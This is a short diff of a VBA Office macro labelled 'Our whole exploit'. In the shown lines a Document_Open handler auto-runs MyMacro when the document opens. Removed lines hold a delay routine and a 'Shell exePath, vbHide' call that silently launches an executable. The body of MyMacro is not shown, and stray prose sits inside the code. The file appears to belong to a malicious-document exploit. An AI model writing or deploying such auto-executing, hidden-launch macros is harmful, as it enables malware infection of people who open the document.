@@ -1,17 +1,3 @@
-Sub Wait(n As Long)
-    Dim t As Date
-    t = Now
-    Do
-        DoEvents
-    Loop Until Now >= DateAdd("s", n, t)
-End Sub
-
-Add our wait and than execute
-    Wait (2)
-    Shell exePath, vbHide
-
-
-Our whole exploit
 Sub Document_Open()
     MyMacro
 End Sub
@@ -38,3 +24,4 @@ Sub Wait(n As Long)
         DoEvents
     Loop Until Now >= DateAdd("s", n, t)
 End Sub
+
